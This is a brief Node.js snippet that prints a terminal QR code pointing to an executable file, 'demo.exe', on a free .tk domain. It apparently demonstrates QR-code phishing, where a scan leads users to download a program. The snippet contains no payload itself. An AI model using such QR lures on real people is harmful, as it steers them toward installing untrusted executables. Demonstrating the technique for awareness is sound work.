
var QRCode = require("qrcode");
QRCode.toString('https://isec.jobs0.tk/demo.exe', { type: 'terminal'}, function (err, data){
    console.log(data);
})